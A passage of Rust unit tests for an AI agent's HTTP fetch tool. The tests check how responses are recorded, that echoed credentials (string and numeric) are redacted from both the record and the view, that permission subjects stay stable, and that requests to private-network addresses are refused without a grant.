            ("404 Not Found", 404, "<html><body>Not Found</body></html>"),
            ("500 Internal Server Error", 500, ""),
            // Truncated/malformed JSON — the shape a capped or cut-off response actually arrives in.
            ("200 OK", 200, r#"{"data":{"id":"cus_4"#),
            // A bare JSON scalar stays the text it was (the interpreter's own rule).
            ("200 OK", 200, "42"),
        ] {
            let base =
                one_shot_with_headers(status_line, vec!["x-trace: abc".into()], body.into()).await;
            let r = tool(PrivateNetAllow::Any)
                .execute(&ctx(), json!({ "url": base }))
                .await
                .unwrap_or_else(|e| panic!("`{status_line}` with {body:?} must not fail: {e}"));
            assert!(!r.is_error, "a {status_line} is a result, not an error");
            let record = record(&r);
            assert_eq!(record["status"], expected_status, "status intact: {record}");
            assert_eq!(
                record["headers"]["x-trace"], "abc",
                "headers intact: {record}"
            );
            assert_eq!(
                record["body"], body,
                "an unparseable body is carried as its raw text: {record}"
            );
        }
    }

    /// The human-facing rendering does not regress: the `view` is the same `HTTP <status>` block a
    /// person read before the record existed, and it is the view — not the canonical JSON — that the
    /// sink and the model are shown.
    #[tokio::test]
    async fn the_human_view_keeps_the_pre_record_rendering() {
        let base = one_shot_with_headers(
            "404 Not Found",
            vec!["content-type: text/html".into()],
            "<h1>nope</h1>".into(),
        )
        .await;
        let r = tool(PrivateNetAllow::Any)
            .execute(&ctx(), json!({ "url": base }))
            .await
            .unwrap();
        let view = r.view.as_deref().expect("a record result carries a view");
        assert!(
            view.starts_with("HTTP 404 Not Found\n"),
            "the status line is unchanged: {view}"
        );
        assert!(
            view.contains("content-type: text/html\n"),
            "the header block is unchanged: {view}"
        );
        assert!(view.ends_with("<h1>nope</h1>"), "the body is last: {view}");
    }

    /// A repeated response header (`set-cookie` is the one that actually repeats) cannot be a
    /// duplicate key in a JSON object. Both values must survive — dropping either silently changes
    /// what the response said.
    #[tokio::test]
    async fn a_repeated_response_header_keeps_both_values() {
        let base = one_shot_with_headers(
            "200 OK",
            vec!["set-cookie: a=1".into(), "set-cookie: b=2".into()],
            "ok".into(),
        )
        .await;
        let r = tool(PrivateNetAllow::Any)
            .execute(&ctx(), json!({ "url": base }))
            .await
            .unwrap();
        assert_eq!(record(&r)["headers"]["set-cookie"], "a=1, b=2");
    }

    /// **The security half of C-304.** The response is the one place a request credential can come
    /// back at you: a vendor that echoes the token into `set-cookie` and into its JSON body.
    ///
    /// Redaction must survive the record. The secret here contains a `"` and a `\` on purpose —
    /// those are ESCAPED by JSON encoding, so a redactor applied only to the finished `content`
    /// (which is what the dispatcher does) would no longer find the literal value. The structured
    /// return must not become the one shape in which a token reaches a model-visible surface.
    #[tokio::test]
    async fn a_credential_echoed_back_in_a_response_header_or_body_is_still_redacted() {
        const TOKEN: &str = r#"sk-live"back\slash"#;
        std::env::set_var("FLUX_WEB_TEST_ECHO_TOKEN", TOKEN);
        let base = one_shot_with_headers(
            "200 OK",
            vec![format!("set-cookie: session={TOKEN}")],
            format!(
                r#"{{"echoed":"{}"}}"#,
                TOKEN.replace('\\', "\\\\").replace('"', "\\\"")
            ),
        )
        .await;
        let t = tool_allowing(PrivateNetAllow::Any, &["FLUX_WEB_TEST_ECHO_TOKEN"]);
        let c = ctx();
        let r = t
            .execute(
                &c,
                json!({
                    "url": base,
                    "headers": { "authorization": { "$secret": "FLUX_WEB_TEST_ECHO_TOKEN" } }
                }),
            )
            .await
            .unwrap();
        assert!(
            !r.content.contains("sk-live"),
            "the echoed credential must not survive in the record: {}",
            r.content
        );
        assert!(
            !r.view.as_deref().unwrap_or_default().contains("sk-live"),
            "nor in the view a person and the model are shown: {:?}",
            r.view
        );
        // …and it is genuinely gone from the structured fields, not merely absent from a rendering.
        let record = record(&r);
        assert_eq!(record["headers"]["set-cookie"], "session=[redacted]");
        assert_eq!(record["body"]["echoed"], "[redacted]");
    }

    // -----------------------------------------------------------------------------------------
    // C-323 — no node kind is exempt from registration
    // -----------------------------------------------------------------------------------------

    /// **The C-323 hole.** An all-digit credential is outside every redaction heuristic *by
    /// construction*: no prefix can mark it, and the contextual `NAME=VALUE` rule requires a letter
    /// precisely so `secret_ttl=3600` survives (pinned in flux-secret by
    /// `an_all_digit_credential_is_registration_only_and_registration_is_total`). Registration is
    /// therefore its only recourse — so a walker that skips `Value::Number` makes that recourse
    /// conditional on the vendor's choice of JSON type: the same credential is protected in
    /// `"account_id":"216…"` and exposed in `"account_id":216…`.
    ///
    /// The second half is the anti-censorship posture: only *registered* values are affected, so an
    /// ordinary port/count/id keeps both its value **and its number type** — a caller comparing
    /// `.body.port == 8080` must not start comparing against a string.
    #[tokio::test]
    async fn a_registered_numeric_credential_echoed_back_as_a_json_number_is_still_redacted() {
        // The same all-digit literal flux-secret's boundary test uses, extended so it is unique.
        const NUMERIC: &str = "216216216216216218";
        std::env::set_var("FLUX_WEB_TEST_NUMERIC_TOKEN", NUMERIC);
        let base = one_shot_with_headers(
            "200 OK",
            vec!["content-type: application/json".into()],
            format!(
                r#"{{"account_id":{NUMERIC},"nested":[{NUMERIC}],"port":8080,"page":2,"ratio":1.5,"ok":true,"none":null}}"#
            ),
        )
        .await;
        let t = tool_allowing(PrivateNetAllow::Any, &["FLUX_WEB_TEST_NUMERIC_TOKEN"]);
        let r = t
            .execute(
                &ctx(),
                json!({
                    "url": base,
                    "headers": { "authorization": { "$secret": "FLUX_WEB_TEST_NUMERIC_TOKEN" } }
                }),
            )
            .await
            .unwrap();
        assert!(
            !r.content.contains(NUMERIC),
            "the registered credential must not survive in the record: {}",
            r.content
        );
        assert!(
            !r.view.as_deref().unwrap_or_default().contains(NUMERIC),
            "nor in the view a person and the model are shown: {:?}",
            r.view
        );
        let record = record(&r);
        assert_eq!(record["body"]["account_id"], "[redacted]");
        assert_eq!(record["body"]["nested"][0], "[redacted]");
        // Anti-censorship: every other scalar is byte-identical AND type-identical.
        assert_eq!(record["body"]["port"], 8080);
        assert!(
            record["body"]["port"].is_number(),
            "an ordinary number keeps its type: {record}"
        );
        assert_eq!(record["body"]["page"], 2);
        assert_eq!(record["body"]["ratio"], 1.5);
        assert_eq!(record["body"]["ok"], true);
        assert!(record["body"]["none"].is_null());
        assert_eq!(record["status"], 200);
        assert!(record["status"].is_number());
    }

    /// The record changed what a caller *reads*; it must not change what the envelope is *told*.
    /// `permission_subjects` and the `NetworkFetch` intent still report the encoded request URL —
    /// a grant is matched against a subject, so a drift here is a security change, not a cosmetic
    /// one. (The positive form is asserted in
    /// `permission_subjects_and_the_intent_report_the_encoded_url`; this pins that the response
    /// shape has no say in it.)
    #[tokio::test]
    async fn the_record_does_not_change_what_the_envelope_is_told() {
        let base = one_shot_with_headers("200 OK", Vec::new(), r#"{"id":1}"#.into()).await;
        let params = json!({ "url": format!("{base}/v1/x"), "query": { "q": "a&b" } });
        let t = tool(PrivateNetAllow::Any);
        let expected = format!("{base}/v1/x?q=a%26b");
        assert_eq!(t.permission_subjects(&params), vec![expected.clone()]);
        assert!(matches!(
            &t.intents(&params).intents[0].target,
            IntentTarget::Url { url } if *url == expected
        ));
        // Executing changes neither: the subject is a function of the request, not the response.
        t.execute(&ctx(), params.clone()).await.unwrap();
        assert_eq!(t.permission_subjects(&params), vec![expected]);
    }

    #[test]
    fn guard_allows_public_refuses_private() {
        // The scope semantics the whole family shares: a public host passes even offline (the guard
        // only errors when a name *resolves* to a private range); a loopback literal is refused
        // without a grant and admitted with one.
        assert!(
            flux_system::net::guard_url_scoped("https://example.com/", &PrivateNetAllow::None)
                .is_ok()
        );
        assert!(
            flux_system::net::guard_url_scoped("http://127.0.0.1:9/", &PrivateNetAllow::None)
                .is_err()
        );
        assert!(
            flux_system::net::guard_url_scoped("http://127.0.0.1:9/", &PrivateNetAllow::Any)
                .is_ok()
        );
    }
}
